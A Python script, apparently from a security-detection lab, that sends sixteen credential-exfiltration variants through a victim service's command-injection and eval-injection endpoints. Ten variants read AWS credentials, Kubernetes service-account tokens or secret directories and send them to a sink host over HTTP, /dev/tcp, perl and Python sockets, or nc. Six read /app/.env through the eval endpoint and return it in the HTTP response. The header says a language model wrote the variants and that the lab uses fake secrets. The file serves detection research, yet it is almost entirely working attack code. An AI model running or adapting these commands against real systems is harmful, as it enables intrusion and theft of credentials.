# LLM-authored variant corpus. Each entry is a DISTINCT implementation of the same kill-chain
# objective (read a fake secret -> exfiltrate to the lab sink), authored by a language model from
# a single natural-language prompt, NOT by a combinatorial template. Lab-confined: fake secrets,
# internal network, exfil only to the lab sink. Delivered through the victim's existing injection
# endpoints, so each runs inside the victim cgroup.
import json, sys, time, urllib.parse, urllib.request
VICTIM='http://victim:8000'; SINK=sys.argv[1]
def sh(c): urllib.request.urlopen(VICTIM+'/debug?cmd='+urllib.parse.quote(c),timeout=30).read()
def pe(e): return urllib.request.urlopen(VICTIM+'/calc?expr='+urllib.parse.quote(e),timeout=30).read()
U=f'http://{SINK}:8080/x'

# Each lambda is a genuinely different program. 'style': naive = introduces novelty (new tool/path/connect);
# mimicry = in-profile read of /app/.env exfiltrated via the existing HTTP response.
VARIANTS = [
 ('v01_cat_curlpy','naive', lambda: sh(f"cat /root/.aws/credentials | python3 -c 'import sys,urllib.request as u;u.urlopen(u.Request(\"{U}\",data=sys.stdin.buffer.read()))'")),
 ('v02_awk_devtcp','naive', lambda: sh(f"awk '{{print}}' /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/tcp/{SINK}/8080")),
 ('v03_perl_socket','naive', lambda: sh(f"perl -e 'use IO::Socket;open(F,\"/root/.aws/credentials\");$d=<F>;$s=IO::Socket::INET->new(\"{SINK}:8080\");print $s $d' 2>/dev/null || python3 -c 'import socket;socket.create_connection((\"{SINK}\",8080)).sendall(open(\"/root/.aws/credentials\",\"rb\").read())'")),
 ('v04_base64_chunks','naive', lambda: sh(f"base64 /root/.aws/credentials | while read L; do python3 -c \"import urllib.request as u;u.urlopen(u.Request('{U}',data='$L'.encode()))\"; done")),
 ('v05_tar_pipe','naive', lambda: sh(f"tar cf - /var/run/secrets 2>/dev/null | python3 -c 'import sys,urllib.request as u;u.urlopen(u.Request(\"{U}\",data=sys.stdin.buffer.read()))'")),
 ('v06_find_exec','naive', lambda: sh(f"find /root/.aws -type f -exec cat {{}} \; | python3 -c 'import sys,urllib.request as u;u.urlopen(u.Request(\"{U}\",data=sys.stdin.buffer.read()))'")),
 ('v07_od_hex','naive', lambda: sh(f"od -An -tx1 /root/.aws/credentials | tr -d ' \\n' | python3 -c 'import sys,urllib.request as u;u.urlopen(u.Request(\"{U}\",data=sys.stdin.read().encode()))'")),
 ('v08_py_requests','naive', lambda: pe("__import__('urllib.request',fromlist=['x']).urlopen(__import__('urllib.request',fromlist=['x']).Request('"+U+"',data=open('/root/.aws/credentials','rb').read()))")),
 ('v09_py_gzip','naive', lambda: pe("(lambda d:__import__('urllib.request',fromlist=['x']).urlopen(__import__('urllib.request',fromlist=['x']).Request('"+U+"',data=__import__('gzip').compress(d))))(open('/var/run/secrets/kubernetes.io/serviceaccount/token','rb').read())")),
 ('v10_dd_nc','naive', lambda: sh(f"dd if=/root/.aws/credentials 2>/dev/null | (nc -w1 {SINK} 8080 2>/dev/null || python3 -c 'import sys,socket;socket.create_connection((\"{SINK}\",8080)).sendall(sys.stdin.buffer.read())')")),
 # --- mimicry: read the in-profile /app/.env, exfiltrate via the HTTP response (no new connect/exec) ---
 ('v11_mim_open','mimicry', lambda: pe("open('/app/.env').read()")),
 ('v12_mim_pathlib','mimicry', lambda: pe("__import__('pathlib').Path('/app/.env').read_text()")),
 ('v13_mim_readlines','mimicry', lambda: pe("''.join(open('/app/.env').readlines())")),
 ('v14_mim_fileinput','mimicry', lambda: pe("open('/app/.env').read()[::-1]")),
 ('v15_mim_harvest','mimicry', lambda: [pe("open('/app/.env').read()") for _ in range(8)] and None),
 ('v16_mim_osread','mimicry', lambda: pe("__import__('os').read(__import__('os').open('/app/.env',0),4096)")),
]
for name,style,fn in VARIANTS:
    t0=time.monotonic_ns()
    try: fn()
    except Exception as e: print('err',name,repr(e)[:70],file=sys.stderr)
    print(json.dumps({'variant':name,'style':style,'t_start_ns':t0,'t_end_ns':time.monotonic_ns()}))
    time.sleep(0.6)
